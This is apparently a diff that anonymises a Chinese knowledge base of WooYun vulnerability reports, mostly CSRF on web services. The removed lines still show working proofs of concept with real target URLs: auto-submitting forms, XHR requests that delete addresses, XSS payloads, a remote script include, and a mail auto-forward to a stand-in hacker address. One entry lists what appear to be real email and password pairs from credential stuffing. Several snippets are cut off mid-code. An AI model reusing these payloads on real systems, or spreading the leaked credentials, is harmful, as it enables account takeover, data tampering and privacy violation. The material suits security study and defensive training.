+**POC**: <form method="POST" name="CSRF" action="https://example.com/[已脱敏]"><input type="hidden" name="name" value="value"/></form><script>document.CSRF.submit();</script>
 
 **绕过**: 直接利用
 
@@ -4789,7 +4789,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 加精华处未验证token，且请求为get，如下http://zone.wooyun.org/index.php?do=action&act=setgood&id=3093那么，如果想给帖子加精华，只需插入一个图片，再@一下领主，就行了POC：[img src="http://zone.wooyun.org/index.php?do=action&act=setgood&id=帖子ID&n=.jpg"/]（此处的&n=.jpg是为了伪装成图片，使得可以正常加载）
+**详情**: 加精华处未验证token，且请求为get，如下https://example.com/[已脱敏] src="https://example.com/[已脱敏]"/]（此处的&n=.jpg是为了伪装成图片，使得可以正常加载）
 
 **POC**: (见原文)
 
@@ -4833,7 +4833,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 删除收货地址1，抓包新建收货地址2构造csrf链接，主要代码：xmlhttp.open("get", "http://order.jiapin.com/view/deleteaddress?address_id=315064 ", true);访问伪造的请求收货地址，已被成功删除。刷新，查看收货地址，验证下address_id为6位纯数字，完全可遍历，后患无穷
+**详情**: 删除收货地址1，抓包新建收货地址2构造csrf链接，主要代码：xmlhttp.open("get", "https://example.com/[已脱敏] ", true);访问伪造的请求收货地址，已被成功删除。刷新，查看收货地址，验证下address_id为6位纯数字，完全可遍历，后患无穷
 
 **POC**: 同上
 
@@ -4843,8 +4843,8 @@
 ---
 
 ---
-### [wooyun-2010-0592] 百度空间潜在的CSRF蠕虫威胁
-**厂商**: 百度 | **年份**: 2010 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2010-0592] 某搜索引擎空间潜在的CSRF蠕虫威胁
+**厂商**: 某搜索引擎 | **年份**: 2010 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -4855,7 +4855,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度wap和web的cookie没用分离,登录web后就自动登录了wap,而wap的接口比较脆弱,易于攻击.wap发文章处数据提交类型默认的是Post,但经过测验,Get提交后也能成功,并且该接口并无Token之类的验证,唯一需要知道的是当前用户的用户名,这个可以参照SOBB-05中的方法获取.
+**详情**: 某搜索引擎wap和web的cookie没用分离,登录web后就自动登录了wap,而wap的接口比较脆弱,易于攻击.wap发文章处数据提交类型默认的是Post,但经过测验,Get提交后也能成功,并且该接口并无Token之类的验证,唯一需要知道的是当前用户的用户名,这个可以参照SOBB-05中的方法获取.
 
 **POC**: (见原文)
 
@@ -4879,7 +4879,7 @@
 
 **详情**: 没有对referer验证，没有加token导致
 
-**POC**: 找了一位用户进行关注然后抓包得到是POST提交访问如下poc页面<html><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><body><form name="csrf" action="http://t.iqiyi.com/api/follow/add.php" method="POST"><input type=text name="star_uids" value="2108875392"></input><input type="submit" value="submit" /></form><s
+**POC**: 找了一位用户进行关注然后抓包得到是POST提交访问如下poc页面<html><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><body><form name="csrf" action="https://example.com/[已脱敏]" method="POST"><input type=text name="star_uids" value="2108875392"></input><input type="submit" value="submit" /></form><s
 
 **绕过**: 直接利用
 
@@ -4887,8 +4887,8 @@
 ---
 
 ---
-### [wooyun-2013-016118] 新浪邮箱存csrf，黑白名单随便设置
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-016118] 某社交平台邮箱存csrf，黑白名单随便设置
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -4899,9 +4899,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 邮箱在设置黑白名单的时候存在csrf，而且完全没有判断是否当前用户，危害还是蛮大的，应用场景：1.比如别人把我加黑名单，我用另外一个给他发邮件，他点击后把黑名单的邮件地址可以变成白名单2.比如我知道对方一直和一个公司或者个人邮件往来，我可以发邮件给他把那个人或域直接加入黑名单，而那个人根本不知道个人认为直接加黑名单方式危害更大，比如商业上的恶意竞争，最后查出来是新浪邮箱的问题的话就囧了
+**详情**: 邮箱在设置黑白名单的时候存在csrf，而且完全没有判断是否当前用户，危害还是蛮大的，应用场景：1.比如别人把我加黑名单，我用另外一个给他发邮件，他点击后把黑名单的邮件地址可以变成白名单2.比如我知道对方一直和一个公司或者个人邮件往来，我可以发邮件给他把那个人或域直接加入黑名单，而那个人根本不知道个人认为直接加黑名单方式危害更大，比如商业上的恶意竞争，最后查出来是某社交平台邮箱的问题的话就囧了
 
-**POC**: 给个加黑名单的把，白名单和域的黑白名单应该也有这个问题<html><body><form id="wrhoooo" name="wrhoooo" action="http://m0.mail.sina.com.cn/wa.php?a=add_antispam" method="post"><input type="test" name="items" value="test@123.com" /><input type="test" name="blacklist" value="1" /><input type="test" name="a" value="add_antispam" /><
+**POC**: 给个加黑名单的把，白名单和域的黑白名单应该也有这个问题<html><body><form id="wrhoooo" name="wrhoooo" action="https://example.com/[已脱敏]" method="post"><input type="test" name="items" value="test@123.com" /><input type="test" name="blacklist" value="1" /><input type="test" name="a" value="add_antispam" /><
 
 **绕过**: 直接利用
 
@@ -4921,7 +4921,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 删除收货地址处存在csrf，其他地方请逐一排查。删除收货地址，抓包拦截;可以看到消息体中国有csrf_token参数，但是实为虚设，因为其为固定值，另外地址id为纯数字自增值，故不存在不可预测参数，伪造恶意链接，主要代码如下：xmlhttp.open("POST", "http://i.yifutu.com/Ajax/space/ManagerAjax.ashx", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("ajaxType=8&id=142623&csrf_token=7068c3f1-ffd9-4215-bd29-a559011b4c67");访问该链接：刷新，地址已被成功删
+**详情**: 删除收货地址处存在csrf，其他地方请逐一排查。删除收货地址，抓包拦截;可以看到消息体中国有csrf_token参数，但是实为虚设，因为其为固定值，另外地址id为纯数字自增值，故不存在不可预测参数，伪造恶意链接，主要代码如下：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("ajaxType=8&id=142623&csrf_token=7068c3f1-ffd9-4215-bd29-a559011b4c67");访问该链接：刷新，地址已被成功删
 
 **POC**: 同上
 
@@ -4943,7 +4943,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、一看修改管理员密码不要原密码验证抓包查看没有toekn值验证2、构造表单进行修改成修改不过这样发给管理一看就知道被修改了3、 我们新建一个html，代码如下<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>乌云测试</h1></td></tr></tbody></table><<meta http-equiv="refresh" content="4;url=http://www.baidu.com/"> <!--设
+**详情**: 1、一看修改管理员密码不要原密码验证抓包查看没有toekn值验证2、构造表单进行修改成修改不过这样发给管理一看就知道被修改了3、 我们新建一个html，代码如下<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>乌云测试</h1></td></tr></tbody></table><<meta http-equiv="refresh" content="4;url=https://example.com/[已脱敏]"> <!--设
 
 **POC**: 1、一看修改管理员密码不要原密码验证抓包查看没有toekn值验证2、构造表单进行修改成修改不过这样发给管理一看就知道被修改了3、 我们新建一个html，代码如下<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>乌云测试</h
 
@@ -4965,7 +4965,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、地址：http://star.cms.qingting.fm2、测试python.exe openssl.py star.cms.qingting.fm|more >>E:\qingting.fm.txt<code>Connecting...Sending Client Hello...Waiting for Server Hello...... received message: type = 22, ver = 0302, length = 66... received message: type = 22, ver = 0302, length = 3685... received message: type = 22, ver = 0302, length = 331... received message: type = 22, ver = 0302, length = 4S
+**详情**: 1、地址：https://example.com/[已脱敏] openssl.py star.cms.qingting.fm|more >>E:\qingting.fm.txt<code>Connecting...Sending Client Hello...Waiting for Server Hello...... received message: type = 22, ver = 0302, length = 66... received message: type = 22, ver = 0302, length = 3685... received message: type = 22, ver = 0302, length = 331... received message: type = 22, ver = 0302, length = 4S
 
 **POC**: 如上
 
@@ -4987,7 +4987,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、添加收货地址，抓包生成POC2、POC：<html><body><form action="http://my.shouliwang.com/MyAccount/MyAccountAjax.asmx/SaveAddress" method="POST"><input type="hidden" name="sysNo" value="" /><input type="hidden" name="name" value="test" /><input type="hidden" name="address" value="test" /><input type="hidden" name="district" value="3544" /><input type="hidden" name="cellPhone" value="13278721234" /><input type="hi
+**详情**: 1、添加收货地址，抓包生成POC2、POC：<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="sysNo" value="" /><input type="hidden" name="name" value="test" /><input type="hidden" name="address" value="test" /><input type="hidden" name="district" value="3544" /><input type="hidden" name="cellPhone" value="13278721234" /><input type="hi
 
 **POC**: (见原文)
 
@@ -4997,8 +4997,8 @@
 ---
 
 ---
-### [wooyun-2010-0102] 百度某系统登陆页面跨站及CSRF漏洞
-**厂商**: 百度 | **年份**: 2010 | **类型**: CSRF
+### [wooyun-2010-0102] 某搜索引擎某系统登陆页面跨站及CSRF漏洞
+**厂商**: 某搜索引擎 | **年份**: 2010 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -5009,9 +5009,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://data.baidu.com:80/report/accounts/checkLogin?password=xx&username=xx该页面username和password两个函数均存在跨站弱点，该页面登录提交方式为post，但是该处存在CSRF漏洞，以该跨站为例，也可进行post跨站。
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://data.baidu.com:80/report/accounts/checkLogin?password="/><script>alert(/liscker/);</script>&username=xxhttp://data.baidu.com:80/report/accounts/checkLogin?password=xx&username=="/><script>alert(/liscker/);</script>POST /report/accounts/checkLogin HTTP/1.1Host: data.baidu.comAccept: */*Referer
+**POC**: https://example.com/[已脱敏]"/><script>alert(/liscker/);</script>&username=xxhttps://example.com/[已脱敏]"/><script>alert(/liscker/);</script>POST /report/accounts/checkLogin HTTP/1.1Host: data.baidu.comAccept: */*Referer
 
 **绕过**: 直接利用
 
@@ -5033,7 +5033,7 @@
 
 **详情**: admin_group.php} elseif($operation == 'deletetype') {//没有验证fromhash导致可以csrf删除$fid = $_GET['fid'];$ajax = $_GET['ajax'];$confirmed = $_GET['confirmed'];$finished = $_GET['finished'];$total = intval($_GET['total']);$pp = intval($_GET['pp']);$currow = intval($_GET['currow']);if($ajax) {ob_end_clean();require_once libfile('function/post');$tids = array();foreach(C::t('forum_thread')->fetch_all_by_fid(
 
-**POC**: 开启群组功能之后发帖添加一个img标签 图片志向http://127.0.0.1/x32/admin.php?action=group&operation=deletetype&fid=11&confirmed=1&ajax=1&pp=2000&total=0&currow=0其中的fid便是分类的id 可以遍历一下 即可删除所有分组
+**POC**: 开启群组功能之后发帖添加一个img标签 图片志向http://[IP已脱敏] 可以遍历一下 即可删除所有分组
 
 **绕过**: 直接利用
 
@@ -5055,7 +5055,7 @@
 
 **详情**: 虽然默认配置下cgi-bin/printenv或者cgi-bin/printenv.cgi printenv.pl返回的数据HTTP头是txt的，但是由于返回的数据库符合json格式，可能导致json劫持，此数据不受httponly的影响
 
-**POC**: dork: inurl:cgi-bin/printenv<script src=http://ttzhibo.com/cgi-bin/printenv.cgi></script><script>alert(HTTP_COOKIE)</script>注意你得有他的COOKIE才行啊，呵呵
+**POC**: dork: inurl:cgi-bin/printenv<script src=https://example.com/[已脱敏])</script>注意你得有他的COOKIE才行啊，呵呵
 
 **绕过**: 直接利用
 
@@ -5077,7 +5077,7 @@
 
 **详情**: 
 
-**POC**: CSRF漏洞，在修改个人资料处。在保存资料处抓包，请求的数据我就不贴上了，传输的都是明文。SCRF POC代码如下：<html><head><title>Csrf Poc</title></head><body><form action="http://i.mizhe.com/account/profile.html" method="post"><input type="hidden" name="nick" value="cnhackers"><input type="hidden" name="sex" value="1"><input type="hidden" name="age" 
+**POC**: CSRF漏洞，在修改个人资料处。在保存资料处抓包，请求的数据我就不贴上了，传输的都是明文。SCRF POC代码如下：<html><head><title>Csrf Poc</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="nick" value="cnhackers"><input type="hidden" name="sex" value="1"><input type="hidden" name="age" 
 
 **绕过**: 直接利用
 
@@ -5097,7 +5097,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.picooc.comPOC<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="http://www.picooc.com/index.php?s=/home/address/save.html" method="POST"><input type="hidden" name="receiver" value="�#152;&#191;�#137;&#147;�#174;&#151;�#137;&#147;" /><input type="hidden" name="province" value="�#164;&#169;�#180;&#165;" /><input type="hidden" name="city" value="�#178;&#179;�
+**详情**: https://example.com/[已脱敏] CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="receiver" value="�#152;&#191;�#137;&#147;�#174;&#151;�#137;&#147;" /><input type="hidden" name="province" value="�#164;&#169;�#180;&#165;" /><input type="hidden" name="city" value="�#178;&#179;�
 
 **POC**: 还多出个别人的收货地址。。
 
@@ -5119,7 +5119,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在B站上，用户是允许绑定微博登陆的，然而绑定的接口是可以CSRF的，也就是说当用户登录后，点击我的链接，我就可以调用该接口完成绑定，绑定后就可以用我使用的微博进行登录了。具体接口如下：https://account.bilibili.com/login?sns=weibo问题的关键点在于此接口的CSRF，而另外一个难题就是如何在用户的浏览器上登录我的微博了。0x01 注册一个微博，然后用微博授权给bilibili。要先授权的原因是在伟哥的漏洞中已经提到过，这里引用并修改一下：“新浪微博的授权有如下特点，如果当前登陆的微博曾经授权过bilibili，那么就会自动绑定成功”0x02 用一个隐藏的iframe在用户的浏览器上登录我们指定的微博。这里使用到的接口有个问题需要注意，就是请求参数中password_4555和vk=4555_a3b5_1907935541，这两个参数是在http://l
+**详情**: 在B站上，用户是允许绑定某社交平台登陆的，然而绑定的接口是可以CSRF的，也就是说当用户登录后，点击我的链接，我就可以调用该接口完成绑定，绑定后就可以用我使用的某社交平台进行登录了。具体接口如下：https://example.com/[已脱敏] 注册一个某社交平台，然后用某社交平台授权给bilibili。要先授权的原因是在伟哥的漏洞中已经提到过，这里引用并修改一下：“某社交平台某社交平台的授权有如下特点，如果当前登陆的某社交平台曾经授权过bilibili，那么就会自动绑定成功”0x02 用一个隐藏的iframe在用户的浏览器上登录我们指定的某社交平台。这里使用到的接口有个问题需要注意，就是请求参数中password_4555和vk=4555_a3b5_1907935541，这两个参数是在http://l
 
 **POC**: 我直接给出我写个一个flask程序，依赖flask和beautifulsoup，就不在我自己的主机上搭测试环境了。$ pip install flask beautifulsoup && python server.pyserver.py，自己改一下weibo_username和weibo_password吧。# -*- coding: utf-8 -*-import requestsimport refrom flask import Flaskfrom BeautifulSoup import BeautifulSoupapp = Flask(__name__)login_weibo_fo
 
@@ -5143,7 +5143,7 @@
 
 **详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。
 
-**POC**: 【第一处】漏洞地址：http://t.91.com/broadcast/add<html><body><form id="imlonghao" name="imlonghao" action="http://t.91.com/broadcast/add" method="post"><input type="text" name="tid" value="" /><input type="text" name="content" value="XX" /><input type="text" name="secret" value="0" /><input type="text" name="
+**POC**: 【第一处】漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="tid" value="" /><input type="text" name="content" value="XX" /><input type="text" name="secret" value="0" /><input type="text" name="
 
 **绕过**: 直接利用
 
@@ -5165,7 +5165,7 @@
 
 **详情**: 今天李姐姐大婶在zone社区发布了一款神器 拿来测试一下 效果相当不错由于数据量少 就拿了一个裤子进行测试 成功条数14条果壳登录接口可被用于撞库 已验证可登录POST /sign_in/?success=https%3A%2F%2Faccount.guokr.com%2Foauth2%2Fauthorize%2F%3Fclient_id%3D32353%26redirect_uri%3Dhttp%253A%252F%252Fwww.guokr.com%252Fsso%252F%253Flazy%253Dy%2526rid%253D691603653%2526success%253Dhttp%25253A%25252F%25252Fwww.guokr.com%25252F%26response_type%3Dcode%26state%3De9c1fee646be06a781a33d44a9
 
-**POC**: littlefaith@126.com----f298731227injuin@163.com----zl810315ricky_eternal@163.com----7uko098iqimu819@163.com----1992819zy350346350@qq.com----5059758a444589012@qq.com----wo58835303517965249@qq.com----517965249550188534@qq.com----zxcv123ssaleey@126.com----ss41913612yooo123321@163.com----yt1994518278732
+**POC**: littlefaith@126.com----f298731227injuin@163.com----zl810315ricky_eternal@163.com----7uko098iqimu819@163.com----1992819zy350346350@某互联网公司.com----5059758a444589012@某互联网公司.com----wo58835303517965249@某互联网公司.com----517965249550188534@某互联网公司.com----zxcv123ssaleey@126.com----ss41913612yooo123321@163.com----yt1994518278732
 
 **绕过**: 直接利用
 
@@ -5173,8 +5173,8 @@
 ---
 
 ---
-### [wooyun-2011-02157] 腾讯微博一处referer限制不严的csrf发帖漏洞
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: CSRF
+### [wooyun-2011-02157] 某互联网公司某社交平台一处referer限制不严的csrf发帖漏洞
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -5185,9 +5185,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯微博一处csrf发帖漏洞，referer限制不严，可以传播蠕虫
+**详情**: 某互联网公司某社交平台一处csrf发帖漏洞，referer限制不严，可以传播蠕虫
 
-**POC**: 一键转发微博的地方，若来源页为http://v.t.qq.com.fffffffff.me/myform.php，则绕过referer过滤<form action="http://v.t.qq.com/cgi-bin/share" method="post" name="myform" id="myform"><input type="hidden" name="content" value="这个姑娘的胸好美啊 http://lvwei.me <?php echo rand(1,1000000);?>"/><input type="hidden" name="url" value="http
+**POC**: 一键转发某社交平台的地方，若来源页为https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="post" name="myform" id="myform"><input type="hidden" name="content" value="这个姑娘的胸好美啊 https://example.com/[已脱敏] <?php echo rand(1,1000000);?>"/><input type="hidden" name="url" value="http
 
 **绕过**: 直接利用
 
@@ -5217,8 +5217,8 @@
 ---
 
 ---
-### [wooyun-2012-08514] 新浪微博某处CSRF漏洞
-**厂商**: 新浪 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-08514] 某社交平台某社交平台某处CSRF漏洞
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -5231,7 +5231,7 @@
 
 **详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。
 
-**POC**: 漏洞地址：http://vote.weibo.com/wbclient/ref<html><body><form id="imlonghao" name="imlonghao" action="http://vote.weibo.com/wbclient/ref" method="post"><input type="text" name="poll_id" value="1742981" /><input type="text" name="content" value="XXXXXXXXXXX" /><input type="text" name="is_first" value="0" 
+**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="poll_id" value="1742981" /><input type="text" name="content" value="XXXXXXXXXXX" /><input type="text" name="is_first" value="0" 
 
 **绕过**: 直接利用
 
@@ -5253,7 +5253,7 @@
 
 **详情**: 华为 花粉俱乐部 网站存在CSRFcn.club.vmall.com
 
-**POC**: 1.注册一个花粉俱乐部网站账号，随便发个帖子，2.把发帖的POST请求拦截下来,发现没有防御CSRF的token3.CSRF预防主要有token和referer。因此，还需要对referer进行测试。经过测试，发现修改为其它网站（如：百度）时，帖子发送失败4.修改为空时，帖子发送成功。5.最后，构造自动提交的CSRF PoC6.victim host点击后，帖子成功发布
+**POC**: 1.注册一个花粉俱乐部网站账号，随便发个帖子，2.把发帖的POST请求拦截下来,发现没有防御CSRF的token3.CSRF预防主要有token和referer。因此，还需要对referer进行测试。经过测试，发现修改为其它网站（如：某搜索引擎）时，帖子发送失败4.修改为空时，帖子发送成功。5.最后，构造自动提交的CSRF PoC6.victim host点击后，帖子成功发布
 
 **绕过**: 直接利用
 
@@ -5275,7 +5275,7 @@
 
 **详情**: 背景：魅族的手机本身有flyme远程账户，用于存储通讯录、短信等私密信息。核心：论坛改版后可使用flyme帐号密码登录论坛.自评：个人给予漏洞等级：高。原因在于用户的通讯录以及私密短信泄漏，并且可操作flyme帐户金额、远程锁定手机等功能。还有很多操作可以执行例如修改CSS样式等操作。不一一列举了。
 
-**POC**: 背景：魅族的手机本身有flyme远程账户，用于存储通讯录、短信等私密信息。核心：论坛改版后可使用flyme帐号密码登录论坛.自评：个人给予漏洞等级：高。原因在于用户的通讯录以及私密短信泄漏，并且可操作flyme帐户金额、远程锁定手机等功能。注意：下方提供的连接中使用的c.cn仅为本机host域名 重现请自己修改JS调用域名等信息图一为IE下的远程JS调用，可直接操控页面连接：http://bbs.meizu.cn/search.php?srchtxt=%22;%3C/script%3E%3CSCRIPT/XSS%20SRC=http://c.cn/1.js%3E%3C/SCRIPT%3E&sr
+**POC**: 背景：魅族的手机本身有flyme远程账户，用于存储通讯录、短信等私密信息。核心：论坛改版后可使用flyme帐号密码登录论坛.自评：个人给予漏洞等级：高。原因在于用户的通讯录以及私密短信泄漏，并且可操作flyme帐户金额、远程锁定手机等功能。注意：下方提供的连接中使用的c.cn仅为本机host域名 重现请自己修改JS调用域名等信息图一为IE下的远程JS调用，可直接操控页面连接：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -5305,8 +5305,8 @@
 ---
 
 ---
-### [wooyun-2011-02088] 网易邮箱CSRF漏洞
-**厂商**: 网易 | **年份**: 2011 | **类型**: CSRF
+### [wooyun-2011-02088] 某互联网公司邮箱CSRF漏洞
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -5317,7 +5317,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网易邮箱有个很强大的功能叫做“自动转发”，然后这个功能没有做CSRF预防。看看设置转发的http包吧：GET /autofw/fwto.do?sid=XXXXXXXXXXXXXXXXXXXXXXXXX&forwarddes=hacker@hacker.com&keeplocal=1&callback=MM.autofwd.valCallback HTTP/1.1Host: config.mail.126.comReferer: http://g4a32.mail.126.com/a/j/dm3/index.jsp?sid=XXXXXXXXXXXXXXXXXXXXXUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.65 Safari/534.24Acc
+**详情**: 某互联网公司邮箱有个很强大的功能叫做“自动转发”，然后这个功能没有做CSRF预防。看看设置转发的http包吧：GET /autofw/fwto.do?sid=XXXXXXXXXXXXXXXXXXXXXXXXX&forwarddes=hacker@hacker.com&keeplocal=1&callback=MM.autofwd.valCallback HTTP/1.1Host: config.mail.126.comReferer: https://example.com/[已脱敏] Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/[IP已脱敏] Safari/534.24Acc
 
 **POC**: (见原文)
 
@@ -5363,7 +5363,7 @@
 
 **详情**: 
 
-**POC**: 修改个人信息没有加上任何验证。提交数据我就不贴上了，现在我们构造一个表单，代码如下：<html><head><title>poc</title></head><body><form action="http://www.s.cn/member-saveMember.html" method="post"><input type="hidden" name="name" value="wooyun"><input type="hidden" name="sex" value="2"><input type="hidden" name="_DTYPE_DATE%5B%5D" value="birt
+**POC**: 修改个人信息没有加上任何验证。提交数据我就不贴上了，现在我们构造一个表单，代码如下：<html><head><title>poc</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="name" value="wooyun"><input type="hidden" name="sex" value="2"><input type="hidden" name="_DTYPE_DATE%5B%5D" value="birt
 
 **绕过**: 直接利用
 
@@ -5383,7 +5383,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先。。抓一只实验小白鼠http://space.fang.com/21191911/index/ 就你了点关注截包，，，如图Get型的。。so easy 有refer  在后面加  “.xxxx” 绕过。。。！！轻松Copy url：http://space.fang.com/?c=relation&a=addfollow&userid=21191911放掉包。。大号已关注换一只小号。换一个浏览器。输入那段url。如图在输入小白鼠的url。。小号已关注
+**详情**: 首先。。抓一只实验小白鼠https://example.com/[已脱敏] 就你了点关注截包，，，如图Get型的。。so easy 有refer  在后面加  “.xxxx” 绕过。。。！！轻松Copy url：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5393,8 +5393,8 @@
 ---
 
 ---
-### [wooyun-2015-090935] QQ邮箱突破token限制CSRF设置任意提醒
-**厂商**: 腾讯 | **年份**: 2015 | **类型**: CSRF
+### [wooyun-2015-090935] 某互联网公司邮箱突破token限制CSRF设置任意提醒
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: CSRF
 
 **元思考**: 触发信号: 后台管理
 
@@ -5405,7 +5405,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我们以往的后台CSRF需要面对的困难是后台操作加上token，就无法构造了。这个思路就可以解决这个难题，通过referer来取得token / sid 之后，利用header重定向，自动实现CSRF。具体到本案例，腾讯邮箱的这个利用构成基于两个要点：1 使用远程图片来获取referer，在QQ邮件中的图片，referer会带有收件人的sid2 使用SID的GET命令来生成日历提醒，定时执行指定内容。通过一个简单的脚本将以上两点结合制作成自动执行功能。这个思路同样适合任何token在链接中的程序，比如wapqq，以及大部分手机应用。操作步骤：将附加代码保存在网站上，向目标受害者发送一封内容普通的邮件，通过插入图片功能调用这个链接。当受害者查看图片的时候，触发CSRF，会后台自动加入一个日历提醒。根据程序代码，3分钟后弹出右下角弹窗，同时在新邮件列表中显示红色醒目文字。这个弹出的内容不但可以写
+**详情**: 我们以往的后台CSRF需要面对的困难是后台操作加上token，就无法构造了。这个思路就可以解决这个难题，通过referer来取得token / sid 之后，利用header重定向，自动实现CSRF。具体到本案例，某互联网公司邮箱的这个利用构成基于两个要点：1 使用远程图片来获取referer，在某互联网公司邮件中的图片，referer会带有收件人的sid2 使用SID的GET命令来生成日历提醒，定时执行指定内容。通过一个简单的脚本将以上两点结合制作成自动执行功能。这个思路同样适合任何token在链接中的程序，比如wap某互联网公司，以及大部分手机应用。操作步骤：将附加代码保存在网站上，向目标受害者发送一封内容普通的邮件，通过插入图片功能调用这个链接。当受害者查看图片的时候，触发CSRF，会后台自动加入一个日历提醒。根据程序代码，3分钟后弹出右下角弹窗，同时在新邮件列表中显示红色醒目文字。这个弹出的内容不但可以写
 
 **POC**: 首先发送一个迷惑邮件，受害者查看邮件是这样的：此时已经感染，3分钟后，受害者桌面右下角会弹出邮箱提示：点开详细内容是这样，不受任何过滤词限制：同时显示在邮件列表中是红色醒目文字：
 
@@ -5449,7 +5449,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在此,我选择曾经的一个活动:用户点击下的对URL则视为成功邀请某好友参加活动http://dellcqg.renren.com/redirect.php?u=Mjg2MzI3MDE4&return_url=http://dellcqg.renren.com/thanksgiving/为了刷这个流量,我们将此URL定为攻击目标第一步,分享一个热门的视频 "杜蕾斯SOS App -紧急快递杜蕾斯",URL为 http://v.youku.com/v_show/id_XNTA5ODEyODQw.html第二步,进入分享页面 http://share.renren.com/?origin=50115 输入视频URL,然后会有弹出层,如下图,让用户填写分享理由此时用 firebug ,修改隐藏的form 将pic字段更改为攻击目标,然后分享大功告成,去首页看看吧这样只要好友打开他的人人主页 即视为邀
+**详情**: 在此,我选择曾经的一个活动:用户点击下的对URL则视为成功邀请某好友参加活动https://example.com/[已脱敏] "杜蕾斯SOS App -紧急快递杜蕾斯",URL为 https://example.com/[已脱敏] https://example.com/[已脱敏] 输入视频URL,然后会有弹出层,如下图,让用户填写分享理由此时用 firebug ,修改隐藏的form 将pic字段更改为攻击目标,然后分享大功告成,去首页看看吧这样只要好友打开他的人人主页 即视为邀
 
 **POC**: (见原文)
 
@@ -5495,7 +5495,7 @@
 
 **详情**: 蝉知企业门户系统 v3.3最新版本 存在csrf漏洞而且我测试的时候发现，即使修改了密码，管理员也不会马上需要重新登陆，所以配合我的回旋镖，可以达到神不知鬼不觉的修改其管理密码接下来，我就来详细的演示漏洞过程
 
-**POC**: 1、我们进入后台，发现没有添加管理员，那么我们来尝试一下修改管理员密码很有意思，我们发现修改管理员的密码，不需要验证原密码~~~好危险撒！那我们再来抓包截断看看有没有token之类的验证2、用burpsuite截断我的小伙伴们都惊呆了 有木有？？没有验证，就两个password3、构造表单吧!<html><body><form id="post123" name="post123" action="http://127.0.0.1/admin.php?m=user&f=changepassword" method="POST"><input type="hidden" name="passwo
